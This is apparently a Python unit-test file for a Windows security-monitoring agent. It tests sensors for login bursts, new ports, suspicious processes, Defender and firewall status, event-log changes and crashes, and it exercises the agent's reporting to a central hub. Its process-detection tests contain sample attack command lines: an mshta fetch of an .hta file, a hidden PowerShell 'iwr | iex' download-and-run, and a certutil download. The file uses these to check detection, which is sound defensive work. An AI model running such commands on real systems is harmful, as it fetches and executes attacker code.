#!/usr/bin/env python3
"""The Windows agent (windows_agent/): its sensors read canned Windows output, its hub client is tried against the REAL hub
code (a Flask test client), so the agent and the hub cannot drift apart without a test failing.
Run:  swarmsentinel-env/bin/python3 backend/tools/test_windows_agent.py"""
import datetime
import os
import sys
import tempfile
import unittest
from collections import namedtuple
from unittest import mock

# SAFETY: throwaway data dirs and keys BEFORE anything imports the hub or the agent.
_TMP = tempfile.mkdtemp()
os.environ['DATA_DIR'] = _TMP
os.environ['DATABASE_URL'] = f'sqlite:///{_TMP}/winagent-test.db'
os.environ['SSAI_API_KEY'] = ADMIN = 'admin-key-for-tests'
os.environ['SSAI_AGENT_HOME'] = os.path.join(_TMP, 'agent-home')
os.environ.pop('SSAI_TRUSTED_PROXIES', None)

HERE = os.path.dirname(os.path.abspath(__file__))
BACKEND = os.path.dirname(HERE)
sys.path[:0] = [os.path.join(BACKEND, 'agents'), BACKEND, os.path.join(os.path.dirname(BACKEND), 'windows_agent')]

from ssai_agent import agent, config, hub, sensors, state as state_module, util  # noqa: E402

NS = 'xmlns="http://schemas.microsoft.com/win/2004/08/events/event"'


def event_xml(record_id, account='bob', address='203.0.113.9', logon_type='3'):
    """One Security-log event, shaped like `wevtutil qe Security /f:xml` prints it."""
    return (f'<Event {NS}><System><EventRecordID>{record_id}</EventRecordID></System><EventData>'
            f'<Data Name="TargetUserName">{account}</Data><Data Name="IpAddress">{address}</Data>'
            f'<Data Name="LogonType">{logon_type}</Data></EventData></Event>')


def new_state():
    return state_module.State(path=os.path.join(tempfile.mkdtemp(), 'state.json'))


def powershell_answering(**by_keyword):
    """A fake PowerShell: the answer depends on which keyword appears in the script it is asked to run."""
    def fake(script, timeout=45):
        for keyword, answer in by_keyword.items():
            if keyword in script:
                return answer
        return ''
    return fake


class Helpers(unittest.TestCase):
    def test_private_addresses_are_masked_and_public_ones_are_not(self):
        text = 'from 192.168.1.50 and 10.1.2.3 and 8.8.8.8 and 172.16.5.5'
        self.assertEqual(util.mask_private_ips(text), 'from 192.168.xxx.xxx and 10.1.xxx.xxx and 8.8.8.8 and 172.16.xxx.xxx')

    def test_private_address_test(self):
        for private in ('192.168.1.1', '10.0.0.5', '127.0.0.1', '::1', 'fe80::1'):
            self.assertTrue(util.is_private_address(private), private)
        for public in ('8.8.8.8', '203.0.113.9', 'not an address', ''):
            self.assertFalse(util.is_private_address(public), public)

    def test_a_missing_tool_gives_empty_text_not_a_crash(self):
        self.assertEqual(util.run_command(['this-program-does-not-exist-ssai']), '')

    def test_powershell_single_object_or_list_both_become_a_list(self):
        self.assertEqual(sensors.powershell_objects('{"a":1}'), [{'a': 1}])
        self.assertEqual(sensors.powershell_objects('[{"a":1},{"a":2}]'), [{'a': 1}, {'a': 2}])
        self.assertEqual(sensors.powershell_objects('garbage'), [])
        self.assertEqual(sensors.powershell_objects(''), [])


class State(unittest.TestCase):
    def test_a_finding_is_sent_once_then_again_after_a_day(self):
        now = [1000.0]
        s = state_module.State(path=os.path.join(tempfile.mkdtemp(), 's.json'), clock=lambda: now[0])
        self.assertTrue(s.should_send('k'))
        s.mark_sent('k')
        self.assertFalse(s.should_send('k'))
        now[0] += state_module.REPEAT_AFTER_SECONDS + 1
        self.assertTrue(s.should_send('k'))

    def test_state_survives_a_restart(self):
        path = os.path.join(tempfile.mkdtemp(), 's.json')
        first = state_module.State(path=path)
        first.put('last_failed_record', 41)
        first.mark_sent('k')
        first.save()
        second = state_module.State(path=path)
        self.assertEqual(second.get('last_failed_record'), 41)
        self.assertFalse(second.should_send('k'))


class Logins(unittest.TestCase):
    def sensor(self, outputs):
        """A LoginSensor whose wevtutil answers come from `outputs`, a list consumed one look at a time."""
        queue = list(outputs)
        return sensors.LoginSensor(new_state(), run=lambda args, timeout=30: queue.pop(0) if queue else '', can_read_log=lambda: True)

    def test_the_first_look_only_notes_where_the_log_ends(self):
        s = self.sensor([''.join(event_xml(i) for i in range(1, 30)), ''])
        self.assertEqual(s.scan(), [])

    def test_a_burst_of_failures_from_one_address_is_reported(self):
        old = ''.join(event_xml(i) for i in range(1, 4))
        burst = ''.join(event_xml(i, account=a) for i, a in zip(range(4, 11), ['admin', 'root', 'sa', 'bob', 'x', 'y', 'z']))
        s = self.sensor([old, '', old + burst, ''])
        s.scan()
        found = s.scan()
        self.assertEqual(len(found), 1)
        self.assertEqual((found[0].threat_type, found[0].severity, found[0].url), ('brute-force', 'medium', '203.0.113.9'))
        self.assertIn('7 failed', found[0].description)

    def test_a_few_typos_are_not_reported(self):
        s = self.sensor([event_xml(1), '', event_xml(1) + event_xml(2) + event_xml(3), ''])
        s.scan()
        self.assertEqual(s.scan(), [])

    def test_twenty_failures_is_high_severity(self):
        burst = ''.join(event_xml(i) for i in range(2, 30))
        s = self.sensor([event_xml(1), '', event_xml(1) + burst, ''])
        s.scan()
        self.assertEqual(s.scan()[0].severity, 'high')

    def test_remote_desktop_from_the_internet_is_reported_but_from_the_lan_is_not(self):
        s = self.sensor(['', event_xml(1, logon_type='10'), '', event_xml(1, logon_type='10')
                         + event_xml(2, address='8.8.4.4', logon_type='10') + event_xml(3, address='192.168.0.7', logon_type='10')])
        s.scan()
        found = s.scan()
        self.assertEqual([f.threat_type for f in found], ['remote-login'])
        self.assertEqual(found[0].url, '8.8.4.4')

    def test_an_unreadable_security_log_is_reported_not_silently_ignored(self):
        s = sensors.LoginSensor(new_state(), run=lambda args, timeout=30: '', can_read_log=lambda: False)
        self.assertEqual(s.scan(), [])
        self.assertIn('cannot read the Windows Security log', s.problem)

    def test_unreadable_log_output_is_harmless(self):
        self.assertEqual(sensors.parse_sign_ins('Access is denied.'), [])


class Ports(unittest.TestCase):
    def listeners(self, *ports):
        import json
        return json.dumps([{'Address': a, 'Port': p, 'Program': name} for a, p, name in ports])

    def sensor(self, *looks):
        queue = list(looks)
        return sensors.PortSensor(new_state(), powershell=lambda script, timeout=45: queue.pop(0))

    def test_ports_open_at_the_first_look_are_normal(self):
        s = self.sensor(self.listeners(('0.0.0.0', 3000, 'node')), self.listeners(('0.0.0.0', 3000, 'node')))
        self.assertEqual(s.scan(), [])
        self.assertEqual(s.scan(), [])

    def test_a_new_port_is_reported_only_when_it_is_still_there_next_time(self):
        base = ('0.0.0.0', 3000, 'node')
        s = self.sensor(self.listeners(base), self.listeners(base, ('0.0.0.0', 4444, 'evil')),
                        self.listeners(base, ('0.0.0.0', 4444, 'evil')), self.listeners(base, ('0.0.0.0', 4444, 'evil')))
        s.scan()
        self.assertEqual(s.scan(), [])                       # seen once: could be a flicker
        found = s.scan()                                     # seen twice: real
        self.assertEqual((found[0].threat_type, found[0].url), ('unexpected-listener', 'localhost:4444'))
        self.assertIn('evil', found[0].description)
        self.assertEqual(s.scan(), [])                       # now known: not reported again

    def test_a_flicker_is_forgotten(self):
        s = self.sensor(self.listeners(), self.listeners(('0.0.0.0', 4444, 'x')), self.listeners(), self.listeners(('0.0.0.0', 4444, 'x')))
        for _ in range(4):
            self.assertEqual(s.scan(), [])

    def test_loopback_dynamic_and_normal_windows_ports_are_ignored(self):
        s = self.sensor(self.listeners(), self.listeners(('127.0.0.1', 4444, 'dev'), ('::1', 4445, 'dev'), ('0.0.0.0', 50000, 'rpc'),
                                                          ('0.0.0.0', 445, 'System')),
                        self.listeners(('127.0.0.1', 4444, 'dev'), ('::1', 4445, 'dev'), ('0.0.0.0', 50000, 'rpc'), ('0.0.0.0', 445, 'System')))
        s.scan()
        s.scan()
        self.assertEqual(s.scan(), [])

    def test_ports_the_owner_allows_are_ignored(self):
        with mock.patch.dict(os.environ, {'SSAI_ALLOWED_PORTS': '8080, 9090'}):
            s = self.sensor(self.listeners(), self.listeners(('0.0.0.0', 8080, 'web')), self.listeners(('0.0.0.0', 8080, 'web')))
            s.scan()
            s.scan()
            self.assertEqual(s.scan(), [])


class Processes(unittest.TestCase):
    def check(self, name, command_line):
        return sensors.rule_for_process(name, command_line)

    def test_miners_and_hacking_tools_are_found_by_name(self):
        self.assertEqual(self.check('XMRig.exe', '')[1], 'high')
        self.assertEqual(self.check('mimikatz.exe', '')[1], 'high')

    def test_clickfix_style_commands_are_found(self):
        self.assertEqual(self.check('mshta.exe', 'mshta.exe https://evil.example/a.hta')[1], 'high')
        self.assertEqual(self.check('powershell.exe', 'powershell -w hidden -c "iwr http://x.example/a | iex"')[1], 'high')
        self.assertEqual(self.check('powershell.exe', 'powershell -enc ' + 'A' * 40)[1], 'medium')
        self.assertEqual(self.check('certutil.exe', 'certutil -urlcache -f http://x.example/a.exe a.exe')[1], 'high')

    def test_ordinary_programs_are_left_alone(self):
        self.assertIsNone(self.check('chrome.exe', 'chrome.exe --type=renderer'))
        self.assertIsNone(self.check('powershell.exe', 'powershell -NoProfile -File C:\\scripts\\backup.ps1'))
        self.assertIsNone(self.check('notepad.exe', None))

    def test_the_finding_never_copies_the_command_line(self):
        import json
        secret = 'powershell -enc ' + 'S3CRETPASSWORD' * 4
        listing = json.dumps([{'ProcessId': 99, 'Name': 'powershell.exe', 'CommandLine': secret}])
        found = sensors.ProcessSensor(new_state(), powershell=lambda s, timeout=45: listing).scan()
        self.assertEqual(len(found), 1)
        self.assertNotIn('S3CRET', found[0].description + found[0].url + found[0].key)


class Security(unittest.TestCase):
    def scan(self, defender, firewall):
        ps = powershell_answering(**{'Get-MpComputerStatus': defender, 'Get-NetFirewallProfile': firewall})
        s = sensors.DefenderSensor(new_state(), powershell=ps)
        return s._defender_problems() + s._firewall_problems()

    def test_defender_real_time_off_is_high(self):
        found = self.scan('{"AntivirusEnabled":true,"RealTimeProtectionEnabled":false,"AntivirusSignatureAge":0}', '[]')
        self.assertEqual([(f.threat_type, f.severity) for f in found], [('protection-off', 'high')])

    def test_stale_definitions_are_medium(self):
        found = self.scan('{"AntivirusEnabled":true,"RealTimeProtectionEnabled":true,"AntivirusSignatureAge":30}', '[]')
        self.assertEqual([(f.threat_type, f.severity) for f in found], [('protection-stale', 'medium')])

    def test_another_antivirus_in_charge_means_silence(self):
        self.assertEqual(self.scan('{"AntivirusEnabled":false,"RealTimeProtectionEnabled":false}', '[]'), [])
        self.assertEqual(self.scan('', '[]'), [])

    def test_a_disabled_firewall_profile_is_high(self):
        found = self.scan('', '[{"Name":"Domain","Enabled":true},{"Name":"Public","Enabled":false}]')
        self.assertEqual(len(found), 1)
        self.assertIn('Public', found[0].description)

    def test_everything_healthy_reports_nothing(self):
        self.assertEqual(self.scan('{"AntivirusEnabled":true,"RealTimeProtectionEnabled":true,"AntivirusSignatureAge":1}',
                                   '[{"Name":"Domain","Enabled":true}]'), [])


class Disk(unittest.TestCase):
    Usage = namedtuple('Usage', 'total used free')

    def scan(self, free_percent):
        with mock.patch.object(sensors.shutil, 'disk_usage', return_value=self.Usage(100, 100 - free_percent, free_percent)):
            return sensors.StabilitySensor(new_state(), drive='C:\\')._disk_problems()

    def test_levels(self):
        self.assertEqual(self.scan(50), [])
        self.assertEqual(self.scan(8)[0].severity, 'medium')
        self.assertEqual(self.scan(3)[0].severity, 'high')


def log_event(record_id, event_id, provider='P', time='2026-11-01T16:31:36.3720000Z', named=None, plain=(), pid=None):
    """One event, shaped like `wevtutil qe <log> /f:xml` prints it: named <Data> items and/or unnamed ones."""
    data = ''.join(f'<Data Name="{k}">{v}</Data>' for k, v in (named or {}).items()) + ''.join(f'<Data>{v}</Data>' for v in plain)
    execution = f'<Execution ProcessID="{pid}" ThreadID="1"/>' if pid is not None else ''
    return (f'<Event {NS}><System><Provider Name="{provider}"/><EventID>{event_id}</EventID>'
            f'<TimeCreated SystemTime="{time}"/><EventRecordID>{record_id}</EventRecordID>{execution}</System>'
            f'<EventData>{data}</EventData></Event>')


def wevtutil_answering(**by_query):
    """A fake wevtutil. A key is the log name, optionally followed by '__' and either an event id ('Security__4720') or a
    provider name; each time a matching query is asked, the next answer in the list is given ('' when they run out)."""
    queues = {key: list(answers) for key, answers in by_query.items()}

    def fake(args, timeout=30):
        text = ' '.join(args)
        for key, queue in queues.items():
            log, _, selector = key.partition('__')
            if f' {log} ' not in f' {text} ':
                continue
            if selector and not ((f'EventID={selector})' in text) if selector.isdigit() else (selector in text)):
                continue
            return queue.pop(0) if queue else ''
        return ''
    return fake


class ParseEvents(unittest.TestCase):
    def test_named_and_unnamed_items_and_the_time_are_read(self):
        events = sensors.parse_events(log_event(7, 41, 'Prov', named={'BugcheckCode': '0'}, plain=('0x0000001e (0x1)',)))
        self.assertEqual((events[0].record_id, events[0].event_id, events[0].provider), (7, 41, 'Prov'))
        self.assertEqual(events[0].data, {'BugcheckCode': '0'})
        self.assertEqual(events[0].fields, ['0', '0x0000001e (0x1)'])
        self.assertEqual(events[0].time.year, 2026)

    def test_garbage_and_empty_output_give_no_events(self):
        self.assertEqual(sensors.parse_events('not xml at all <<<'), [])
        self.assertEqual(sensors.parse_events(''), [])


class Events(unittest.TestCase):
    def sensor(self, **answers):
        return sensors.EventSensor(new_state(), run=wevtutil_answering(**answers), can_read_log=lambda: True)

    def test_the_first_look_only_notes_where_the_logs_end(self):
        s = self.sensor(System__7045=[log_event(1, 7045, named={'ServiceName': 'old', 'ImagePath': 'C:\\Windows\\x.exe'}), ''])
        self.assertEqual(s.scan(), [])

    def test_a_new_service_from_a_user_folder_is_high_and_its_path_is_not_copied(self):
        path = 'C:\\Users\\bob\\AppData\\Local\\Temp\\evil.exe --password hunter2'
        s = self.sensor(System__7045=[log_event(1, 7045), log_event(1, 7045) + log_event(2, 7045, named={'ServiceName': 'Updater', 'ImagePath': path})])
        s.scan()
        found = s.scan()
        self.assertEqual([(f.threat_type, f.severity) for f in found], [('new-service', 'high')])
        self.assertNotIn('hunter2', found[0].description)
        self.assertNotIn('AppData', found[0].description)

    def test_a_service_in_program_files_is_low_and_one_elsewhere_is_medium(self):
        def severity(path):
            s = self.sensor(System__7045=[log_event(1, 7045), log_event(1, 7045) + log_event(2, 7045, named={'ServiceName': 'S', 'ImagePath': path})])
            s.scan()
            return s.scan()[0].severity
        self.assertEqual(severity('"C:\\Program Files\\Vendor\\svc.exe"'), 'low')
        self.assertEqual(severity('D:\\tools\\svc.exe'), 'medium')

    def test_a_cleared_security_log_is_high(self):
        s = self.sensor(Security__1102=[log_event(5, 1102), log_event(5, 1102) + log_event(6, 1102)])
        s.scan()
        found = s.scan()
        self.assertEqual([(f.threat_type, f.severity) for f in found], [('log-cleared', 'high')])
        self.assertIn('Security', found[0].description)

    def test_adding_someone_to_administrators_is_high_but_other_groups_are_ignored(self):
        admin = log_event(9, 4732, named={'TargetSid': 'S-1-5-32-544', 'MemberSid': 'S-1-5-21-1-2-3-1001', 'SubjectUserName': 'bob'})
        users = log_event(10, 4732, named={'TargetSid': 'S-1-5-32-545', 'MemberSid': 'S-1-5-21-1-2-3-1002', 'SubjectUserName': 'bob'})
        s = self.sensor(Security__4732=[log_event(1, 4732), log_event(1, 4732) + admin + users])
        s.scan()
        found = s.scan()
        self.assertEqual([(f.threat_type, f.severity) for f in found], [('admin-change', 'high')])

    def test_a_new_account_is_medium(self):
        s = self.sensor(Security__4720=[log_event(1, 4720), log_event(1, 4720) + log_event(2, 4720, named={'TargetUserName': 'helpdesk2'})])
        s.scan()
        found = s.scan()
        self.assertEqual([(f.threat_type, f.severity) for f in found], [('new-account', 'medium')])
        self.assertIn('helpdesk2', found[0].description)

    def test_windows_own_scheduled_tasks_are_ignored_others_are_low(self):
        own = log_event(2, 4698, named={'TaskName': '\\Microsoft\\Windows\\Defrag\\ScheduledDefrag'})
        mine = log_event(3, 4698, named={'TaskName': '\\Backup nightly'})
        s = self.sensor(Security__4698=[log_event(1, 4698), log_event(1, 4698) + own + mine])
        s.scan()
        found = s.scan()
        self.assertEqual([(f.threat_type, f.severity) for f in found], [('new-scheduled-task', 'low')])

    def test_flagged_powershell_is_counted_and_the_script_is_never_copied(self):
        flagged = ''.join(log_event(i, 4104, named={'ScriptBlockText': 'secret-token-123'}) for i in (2, 3, 4))
        s = self.sensor(**{'Microsoft-Windows-PowerShell/Operational': [log_event(1, 4104), log_event(1, 4104) + flagged]})
        s.scan()
        found = s.scan()
        self.assertEqual(len(found), 1)
        self.assertIn('3 PowerShell', found[0].description)
        self.assertNotIn('secret-token', found[0].description)

    def test_flagged_powershell_the_agent_started_itself_is_not_a_finding(self):
        """Windows logs its own generated module wrappers (loaded by the agent's Get-NetTCPConnection) as warnings."""
        util.note_child(4242)
        ours = ''.join(log_event(i, 4104, named={'ScriptBlockText': 'wrapper'}, pid=4242) for i in (2, 3, 4))
        s = self.sensor(**{'Microsoft-Windows-PowerShell/Operational': [log_event(1, 4104), log_event(1, 4104) + ours]})
        s.scan()
        self.assertEqual(s.scan(), [])

    def test_flagged_powershell_from_another_process_still_counts_when_mixed_with_the_agents_own(self):
        util.note_child(4243)
        mixed = (''.join(log_event(i, 4104, named={'ScriptBlockText': 'wrapper'}, pid=4243) for i in (2, 3))
                 + log_event(4, 4104, named={'ScriptBlockText': 'evil'}, pid=777)
                 + log_event(5, 4104, named={'ScriptBlockText': 'no pid logged'}))
        s = self.sensor(**{'Microsoft-Windows-PowerShell/Operational': [log_event(1, 4104), log_event(1, 4104) + mixed]})
        s.scan()
        found = s.scan()
        self.assertEqual(len(found), 1)
        self.assertIn('2 PowerShell', found[0].description)

    def test_the_agents_children_are_remembered_by_run_command_and_forgotten_after_a_while(self):
        import sys
        util.run_command([sys.executable, '-c', 'pass'])
        self.assertTrue(util.own_child_pids())
        with mock.patch.object(util.time, 'monotonic', return_value=util.time.monotonic() + 31 * 60):
            self.assertEqual(util.own_child_pids(), set())

    def test_without_access_to_the_security_log_it_says_so_and_still_watches_the_rest(self):
        s = sensors.EventSensor(new_state(), run=wevtutil_answering(), can_read_log=lambda: False)
        self.assertEqual(s.scan(), [])
        self.assertIn('cannot read the Windows Security log', s.problem)


class Defender(unittest.TestCase):
    def sensor(self, detections=(), posture=''):
        queue = list(detections)
        ps = powershell_answering(**{'Get-MpThreatDetection': None, 'EnableControlledFolderAccess': posture})

        def fake(script, timeout=45):
            if 'Get-MpThreatDetection' in script:
                return queue.pop(0) if queue else ''
            return ps(script, timeout)
        return sensors.DefenderSensor(new_state(), powershell=fake)

    OLD = '{"Id":"1","Threat":"Old.Thing","Severity":2,"Resource":"file:_C:\\\\Users\\\\bob\\\\old.exe"}'
    NEW = '{"Id":"2","Threat":"Trojan:Win32/Bad","Severity":5,"Resource":"file:_C:\\\\Users\\\\bob\\\\Downloads\\\\setup.exe"}'

    def test_what_defender_already_found_before_the_first_look_is_history(self):
        s = self.sensor(detections=[self.OLD, self.OLD])
        self.assertEqual(s.scan(), [])
        self.assertEqual(s.scan(), [])

    def test_a_new_detection_is_reported_with_the_file_name_only(self):
        s = self.sensor(detections=[self.OLD, '[' + self.OLD + ',' + self.NEW + ']'])
        s.scan()
        found = s.scan()
        self.assertEqual([(f.threat_type, f.severity, f.url) for f in found], [('malware-detected', 'high', 'setup.exe')])
        self.assertIn('Trojan:Win32/Bad', found[0].description)
        self.assertNotIn('bob', found[0].description)

    def test_ransomware_and_asr_protections_off_are_low(self):
        s = self.sensor(posture='{"Active":true,"FolderAccess":0,"AsrRules":0}')
        found = s.scan()
        self.assertEqual(sorted((f.threat_type, f.severity) for f in found),
                         [('protection-off', 'low'), ('ransomware-protection-off', 'low')])

    def test_protections_on_or_another_antivirus_in_charge_report_nothing(self):
        self.assertEqual(self.sensor(posture='{"Active":true,"FolderAccess":1,"AsrRules":4}').scan(), [])
        self.assertEqual(self.sensor(posture='{"Active":false,"FolderAccess":0,"AsrRules":0}').scan(), [])
        self.assertEqual(self.sensor(posture='').scan(), [])


class Stability(unittest.TestCase):
    NOW = datetime.datetime(2026, 11, 1, 17, 0, 0, tzinfo=datetime.timezone.utc).timestamp()

    def sensor(self, **answers):
        return sensors.StabilitySensor(new_state(), run=wevtutil_answering(**answers), clock=lambda: self.NOW)

    @staticmethod
    def crash(record_id, code='0x0000001e', time='2026-11-01T16:31:36.0000000Z'):
        return log_event(record_id, 1001, 'Microsoft-Windows-WER-SystemErrorReporting', time=time,
                         plain=(f'{code} (0xffffffffc0000005, 0x1, 0x0, 0x8)', 'C:\\WINDOWS\\Minidump\\x.dmp'))

    def test_a_crash_in_the_last_day_is_reported_on_the_first_look_with_its_name(self):
        s = self.sensor(System__1001=[self.crash(1), self.crash(1)])
        found = s.scan()
        self.assertEqual([(f.threat_type, f.severity) for f in found], [('system-crash', 'medium')])
        self.assertIn('KMODE_EXCEPTION_NOT_HANDLED', found[0].description)

    def test_an_old_crash_is_not_reported_on_the_first_look(self):
        old = self.crash(1, time='2026-10-20T10:00:00.0000000Z')
        self.assertEqual(self.sensor(System__1001=[old, old]).scan(), [])

    def test_three_crashes_in_a_day_add_a_high_repeated_crash_finding(self):
        three = self.crash(1) + self.crash(2, '0x0000000a') + self.crash(3, '0x0000001a')
        found = self.sensor(System__1001=[three, three]).scan()
        self.assertEqual(sorted((f.threat_type, f.severity) for f in found),
                         [('repeated-crashes', 'high'), ('system-crash', 'medium'), ('system-crash', 'medium'), ('system-crash', 'medium')])

    def test_later_looks_report_only_new_crashes(self):
        s = self.sensor(System__1001=[self.crash(1), self.crash(1), self.crash(1) + self.crash(2)])
        s.scan()
        found = s.scan()
        self.assertEqual([f.key for f in found], ['crash:2'])

    @staticmethod
    def power(record_id, code, time='2026-11-01T16:31:23.0000000Z'):
        return log_event(record_id, 41, 'Microsoft-Windows-Kernel-Power', time=time, named={'BugcheckCode': code})

    def test_a_power_loss_is_reported_as_an_unexpected_shutdown_not_a_crash(self):
        found = self.sensor(System__41=[self.power(4, '0'), self.power(4, '0')]).scan()
        self.assertEqual([f.threat_type for f in found], ['unexpected-shutdown'])
        self.assertEqual(found[0].key, 'shutdown:4')

    def test_a_crash_recorded_by_both_events_is_counted_once(self):
        # 0x1E is 30 in decimal, which is how Kernel-Power 41 writes it; 13 seconds apart is one crash
        found = self.sensor(System__1001=[self.crash(1), self.crash(1)], System__41=[self.power(5, '30'), self.power(5, '30')]).scan()
        self.assertEqual([f.threat_type for f in found], ['system-crash'])

    def test_a_crash_only_kernel_power_remembers_is_still_reported(self):
        # when Windows cannot write a dump (as happened on this PC) the bug check event is missing entirely
        found = self.sensor(System__41=[self.power(7, '59'), self.power(7, '59')]).scan()
        self.assertEqual([(f.threat_type, f.key) for f in found], [('system-crash', 'crash-power:7')])
        self.assertIn('SYSTEM_SERVICE_EXCEPTION', found[0].description)

    def test_a_fatal_hardware_error_is_high_and_corrected_ones_are_medium(self):
        corrected = log_event(7, 19, 'Microsoft-Windows-WHEA-Logger')
        fatal = log_event(8, 18, 'Microsoft-Windows-WHEA-Logger')
        whea = 'System__Microsoft-Windows-WHEA-Logger'
        self.assertEqual(self.sensor(**{whea: [corrected, corrected]}).scan()[0].severity, 'medium')
        found = self.sensor(**{whea: [corrected + fatal, corrected + fatal]}).scan()
        self.assertEqual((found[0].threat_type, found[0].severity), ('hardware-error', 'high'))

    def test_an_unreadable_log_reports_nothing(self):
        self.assertEqual(self.sensor().scan(), [])


class EverySensorIsRegistered(unittest.TestCase):
    def test_the_agent_runs_all_six_with_distinct_names(self):
        names = [s.agent_name for s in sensors.all_sensors(new_state())]
        self.assertEqual(len(names), 6)
        self.assertEqual(len(set(names)), 6)
        self.assertTrue({'WinDefenderAgent', 'WinEventAgent', 'WinStabilityAgent'} <= set(names))
        self.assertFalse({'WinSecurityAgent', 'WinDiskAgent'} & set(names))   # folded into Defender and Stability


class HubClientAgainstTheRealHub(unittest.TestCase):
    """The agent's hub client talking to the real Flask routes through a test client."""

    @classmethod
    def setUpClass(cls):
        import app as appmod
        if _TMP not in appmod.app.config['SQLALCHEMY_DATABASE_URI']:
            raise RuntimeError('refusing to run against a non-test database')
        cls.appmod, cls.app, cls.db = appmod, appmod.app, appmod.db
        cls.app.config['TESTING'] = True
        appmod._AUDIT_PATH = os.path.join(_TMP, 'audit.jsonl')
        from models import Agent, EnrollmentCode, Node, Threat
        cls.models = (Threat, Agent, Node, EnrollmentCode)

    def setUp(self):
        self.ctx = self.app.app_context()
        self.ctx.push()
        self.db.create_all()
        for model in self.models:
            model.query.delete()
        self.db.session.commit()
        import auth
        auth.enroll_failures = auth.SlidingWindow(5, 300)
        auth.node_ingest = auth.SlidingWindow(600, 60)
        self.http = self.app.test_client()
        self.online = True

    def tearDown(self):
        self.db.session.remove()
        self.ctx.pop()

    def transport(self, method, url, payload, token):
        """Stand in for the network: send the request to the Flask test client instead."""
        if not self.online:
            return 0, {}
        path = '/' + url.split('/', 3)[3]
        headers = {'X-API-Key': token} if token else {}
        reply = self.http.open(path, method=method, json=payload, headers=headers)
        return reply.status_code, reply.get_json(silent=True) or {}

    def enrolled_client(self, name='WINPC'):
        code = self.http.post('/api/nodes/enrollment-codes', json={}, headers={'X-API-Key': ADMIN}).get_json()['code']
        saved, problem = hub.enroll('http://hub.test:5000', code, name, name, transport=self.transport)
        self.assertEqual(problem, '')
        return hub.HubClient(config.Settings(**saved), transport=self.transport), saved

    def test_enrolling_gives_a_working_credential_and_a_used_code_is_refused(self):
        client, saved = self.enrolled_client()
        self.assertEqual((saved['node_id'], saved['api']), ('WINPC', 'http://hub.test:5000/api'))
        self.assertTrue(saved['token'].startswith('ssn_'))
        node = self.models[2].query.filter_by(node_id='WINPC').one()
        self.assertEqual(node.platform, 'windows')
        again, problem = hub.enroll('http://hub.test:5000', 'AAAA-BBBB-CCCC-DDDD', 'X', 'X', transport=self.transport)
        self.assertIsNone(again)
        self.assertIn('invalid', problem)

    def test_an_unreachable_hub_is_explained(self):
        self.online = False
        saved, problem = hub.enroll('http://hub.test:5000', 'AAAA-BBBB-CCCC-DDDD', 'X', 'X', transport=self.transport)
        self.assertIsNone(saved)
        self.assertIn('cannot reach', problem)

    def test_agents_appear_with_the_machine_name_and_windows_platform(self):
        client, _ = self.enrolled_client()
        client.register('WinLoginAgent', 'auth_monitor', 'watches sign-ins')
        row = self.models[1].query.filter_by(name='WinLoginAgent@WINPC').one()
        self.assertEqual(row.platform, 'windows')
        self.assertEqual(client.heartbeat('WinLoginAgent', 3, 1, '2026-10-31T00:00:00+00:00'), 200)

    def test_a_finding_arrives_masked_with_the_real_address_kept_for_the_admin(self):
        client, _ = self.enrolled_client()
        client.send_finding(sensors.Finding('192.168.0.77', 'brute-force', 'medium',
                                            '8 failed sign-ins from 192.168.0.77', 'k'), 'WinLoginAgent')
        threat = self.models[0].query.one()
        self.assertEqual(threat.url, '192.168.xxx.xxx')
        self.assertNotIn('192.168.0.77', threat.description)
        self.assertEqual(threat.node_id, 'WINPC')
        self.assertTrue(threat.detected_by.endswith('@WINPC'))

    def test_findings_wait_while_the_hub_is_down_and_arrive_afterwards(self):
        client, _ = self.enrolled_client()
        finding = sensors.Finding('203.0.113.5', 'brute-force', 'high', 'x', 'k')
        self.online = False
        client.send_finding(finding, 'WinLoginAgent')
        self.assertEqual(len(client.waiting), 1)
        self.assertEqual(self.models[0].query.count(), 0)
        self.online = True
        client.resend_waiting()
        self.assertEqual((len(client.waiting), self.models[0].query.count()), (0, 1))

    def test_a_revoked_machine_is_told_so(self):
        client, saved = self.enrolled_client()
        self.http.post('/api/nodes/WINPC/revoke', headers={'X-API-Key': ADMIN})
        client.send_finding(sensors.Finding('203.0.113.5', 'x', 'low', 'x', 'k'), 'WinLoginAgent')
        self.assertTrue(client.credential_rejected)
        self.assertEqual(len(client.waiting), 0)             # a refusal is final: not retried forever

    def test_a_whole_runner_pass_reaches_the_dashboard(self):
        client, _ = self.enrolled_client()
        state = new_state()
        burst = ''.join(event_xml(i) for i in range(2, 12))
        looks = [event_xml(1), '', event_xml(1) + burst, '']
        login = sensors.LoginSensor(state, run=lambda args, timeout=30: looks.pop(0) if looks else '', can_read_log=lambda: True)
        runner = agent.AgentRunner(client, state, [login])
        runner.register_all()
        runner.run_sensor(login)
        runner.run_sensor(login)
        self.assertEqual(self.models[0].query.count(), 1)
        self.assertEqual(runner.found['WinLoginAgent'], 1)
        runner.run_sensor(login)                               # same burst again: not sent twice
        self.assertEqual(self.models[0].query.count(), 1)


class Runner(unittest.TestCase):
    class FakeClient:
        credential_rejected = False

        def __init__(self):
            self.calls = []

        def register(self, *a):
            self.calls.append(('register', a[0]))

        def heartbeat(self, name, *a):
            self.calls.append(('heartbeat', name))
            return 200

        def send_finding(self, finding, by):
            self.calls.append(('finding', finding.key))

    class Boom(sensors.Sensor):
        agent_name = 'Boom'

        def scan(self):
            raise RuntimeError('windows said no')

    class Once(sensors.Sensor):
        agent_name = 'Once'

        def scan(self):
            return [sensors.Finding('u', 'disk-low', 'low', 'd', 'same-key')]

    def test_one_broken_sensor_does_not_stop_the_others(self):
        client, state = self.FakeClient(), new_state()
        runner = agent.AgentRunner(client, state, [self.Boom(state), self.Once(state)])
        runner.run_due()
        self.assertIn(('finding', 'same-key'), client.calls)
        self.assertIn(('heartbeat', 'Boom'), client.calls)

    def test_sensors_run_when_due_not_every_tick(self):
        now = [0.0]
        client, state = self.FakeClient(), new_state()
        sensor = self.Once(state)
        sensor.interval = 100
        runner = agent.AgentRunner(client, state, [sensor], clock=lambda: now[0])
        runner.run_due()
        now[0] = 50
        runner.run_due()
        self.assertEqual(runner.scans['Once'], 1)
        now[0] = 101
        runner.run_due()
        self.assertEqual(runner.scans['Once'], 2)

    def test_dry_run_sends_nothing(self):
        state = new_state()
        runner = agent.AgentRunner(None, state, [self.Once(state)])
        self.assertEqual(len(runner.run_sensor(runner.sensors[0], send=False)), 1)


class Settings(unittest.TestCase):
    def test_settings_round_trip_and_an_unenrolled_pc_has_none(self):
        with mock.patch.dict(os.environ, {'SSAI_AGENT_HOME': tempfile.mkdtemp()}):
            self.assertIsNone(config.load_settings())
